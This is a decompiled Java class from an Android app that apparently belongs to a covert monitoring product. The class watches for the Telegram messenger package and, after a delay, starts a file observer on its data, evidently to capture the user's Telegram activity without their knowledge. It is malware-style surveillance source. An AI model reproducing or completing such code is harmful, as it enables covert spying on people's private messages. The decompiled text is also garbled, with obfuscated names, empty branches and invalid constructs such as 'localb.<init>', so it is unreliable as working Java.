package com.vvt.capture.telegram.a;

import android.os.SystemClock;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;

public class a
  implements e, m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private b d;
  private i e;
  private j f;
  private boolean g;
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.g = bool;
    this.e = parami;
    j localj = this.f;
    if (localj == null)
    {
      localj = j.a();
      this.f = localj;
    }
    localj = this.f;
    String str = "org.telegram.messenger";
    localj.a(str, this);
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    try
    {
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.d;
        ((b)localObject).stopWatching();
      }
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (!bool) {}
      }
      localObject = this.f;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.f;
        String str = "org.telegram.messenger";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject;
        bool = c;
        if (!bool) {}
      }
    }
    localObject = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    bool = a;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.g = false;
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.d;
        ((b)localObject).stopWatching();
      }
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (!bool) {}
      }
      localObject = this.f;
      if (localObject != null)
      {
        localObject = this.f;
        String str = "org.telegram.messenger";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    localObject = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2) {}
  
  public void c(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    long l = 15000L;
    SystemClock.sleep(l);
    b localb = this.d;
    if (localb == null)
    {
      bool = b;
      if (bool) {}
      localb = new com/vvt/capture/telegram/a/b;
      localb.<init>(this, paramString2);
      this.d = localb;
      localb = this.d;
      localb.startWatching();
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */